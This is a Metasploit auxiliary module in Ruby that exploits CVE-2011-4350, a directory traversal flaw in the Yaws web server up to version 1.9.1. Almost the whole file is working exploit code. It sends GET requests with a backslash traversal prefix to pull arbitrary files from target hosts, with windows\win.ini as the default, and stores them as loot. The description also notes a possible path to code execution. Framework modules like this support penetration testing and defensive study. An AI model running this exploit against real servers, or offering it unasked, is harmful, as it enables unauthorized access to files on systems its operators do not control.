##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Yaws Web Server Directory Traversal",
      'Description'    => %q{
          This module exploits a directory traversal bug in Yaws v1.9.1 or less.
        The module can only be used to retrieve files. However, code execution might
        be possible. Because when the malicious user sends a PUT request, a file is
        actually created, except no content is written.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'sinn3r', # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2011-4350'],
          ['OSVDB', '77581'],
          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=757181']
        ],
      'DisclosureDate' => "Nov 25 2011"
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\win.ini'])
      ])

    deregister_options('RHOST')
  end

  def run_host(ip)
    # No point to continue if no filename is specified
    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
      print_error("Please supply the name of the file you want to download")
      return
    end

    # Create request
    traversal = "..\\..\\..\\..\\"
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "/#{traversal}/#{datastore['FILEPATH']}"
    }, 25)

    # Show data if needed
    if res and res.code == 200
      vprint_line(res.to_s)
      fname = File.basename(datastore['FILEPATH'])

      path = store_loot(
        'yaws.http',
        'application/octet-stream',
        ip,
        res.body,
        fname
      )
      print_status("File saved in: #{path}")
    else
      print_error("Nothing was downloaded")
    end
  end
end
